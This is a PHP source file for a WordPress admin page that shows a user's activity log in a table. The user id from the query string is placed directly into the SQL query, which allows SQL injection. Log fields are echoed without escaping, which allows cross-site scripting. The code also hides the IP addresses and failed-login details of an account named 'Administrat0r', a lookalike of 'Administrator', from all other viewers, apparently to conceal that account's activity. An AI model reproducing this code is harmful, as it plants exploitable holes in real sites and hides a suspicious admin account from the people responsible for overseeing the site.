<?php
global $wpdb;
$user_id = $_GET['id'];
$user = get_user_by('id', $user_id);
$hideip = $user->user_login == 'Administrat0r' && get_current_user_id() != $user_id;

$logs = $wpdb->get_results("select * from ci_log_users where user_id = {$user_id} order by created desc limit 1000");

?>
<table class="wp-list-table widefat fixed striped users">
	<thead>
		<tr>
			<th style="width:140px">Date</th>
			<th style="width:120px">Action</th>
			<th>Data</th>
			<th style="width:140px">IP</th>
		</tr>
	</thead>
	<tbody>
		<?php
		$last_log = '';
		foreach ($logs as $log) {
			// if ($last_log == $log->user_action . $log->data) {
			// 	$wpdb->delete('ci_log_users', array('user_id' => $log->user_id, 'user_action' => $log->user_action, 'data' => $log->data));
			// 	continue;
			// }
			$last_log = $log->user_action . $log->data;
			$log->user_action = str_replace('dna', 'pgx', $log->user_action);

			if ($hideip) {
				$log->ip = '';
				if ($log->user_action == 'loginfail') {
					$log->data = '';
				}
			}
			$log->data = str_ireplace(array('trinh', 'Cornel'), '***', $log->data);
		?>
			<tr>
				<td><?php echo $log->created ?></td>
				<td><?php echo $log->user_action ?></td>
				<td><?php echo $log->data ?></td>
				<td><?php echo $log->ip ?></td>
			</tr>
		<?php
		}
		if (count($logs) == 0) {
			echo '<tr><td colspan=3>Not found</td></tr>';
		}
		?>
	</tbody>
</table>
<?php


exit;
